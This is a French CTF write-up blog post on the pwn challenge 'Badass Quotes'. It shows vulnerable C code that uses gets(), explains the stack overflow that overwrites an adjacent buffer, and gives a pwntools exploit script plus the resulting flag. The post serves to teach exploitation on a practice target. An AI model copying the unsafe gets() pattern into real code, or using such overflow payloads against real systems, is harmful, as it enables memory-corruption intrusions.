---
title: "[CSW CTF] - Badass Quotes (500)"
date: 2022-01-02
categories: ['pwn']
draft: false
---

---
### Author : `Rxphgui` 
---

Aujourd'hui on va voir un challenge du CSW CTF. Un challenge de pwn dont j'ai eu le second solve (à 1 sec du first blood 0_0).

## Review du Code
Nous avions simplement le code source en C suivant :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    char term[64];
    char quote[32];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    memset(term, 0, 64);
	memset(quote, 0, 32);

    printf("\nI CaN HaS BaDaSs QuOtE?\n# ");
    gets(quote);

    if (strcmp(term, "BaDaSs I Am") == 0) {
        printf("\n");
        system("cat flag.txt");
        } else if(strlen(term) !    = 0) {    
            printf("\nI haz a sad %s...\n\n", term);
    } else {
	    printf("\nI haz a sad...\n\n");
	}

	printf(" ,_     _\n");
	printf(" |\\_,-~/\n");
	printf(" / _  _ |    ,--.\n");
	printf("(  @  @ )   / ,-'\n");
	printf(" \  _T_/-._( (   \n");
	printf(" /         `. \  \n");
	printf("|         _  \ | \n");
	printf(" \ \ ,  /      | \n");
	printf("  || |-_\__   /  \n");
	printf(" ((_/`(____,-'   \n");
	
}
```

## Exploitation 
Pour avoir le flag, on doit écrire sur `term` *"BaDaSs I Am"*.
On voit deux memset :
```c
memset(term, 0, 64);
memset(quote, 0, 32);
```

L'entrée utilisateur est `gets`, nous pouvons donc faire un buffer overflow.
```c
gets(quote);
```
Si nous écrivons plus de 32 caractères, nous allons écrire sur `term`.

## Payload [Pwntools]
```py
from pwn import *

elf = context.binary = ELF('./vuln')
p = elf.process()
r = remote('cybersecweek.ua.pt', 2010)

buffer = b"A"*32
strings_win = b"BaDaSs I Am"

payload = buffer + strings_win
print(payload)
r.sendline(payload)

r.interactive()
```

Nous obtenons alors :
```
CTFUA{!YoU_Ar3_B4dAss!}
```
Merci d'avoir lu & merci [Bryton](https://www.youtube.com/c/Opcode) de m'avoir volé le first blood :")
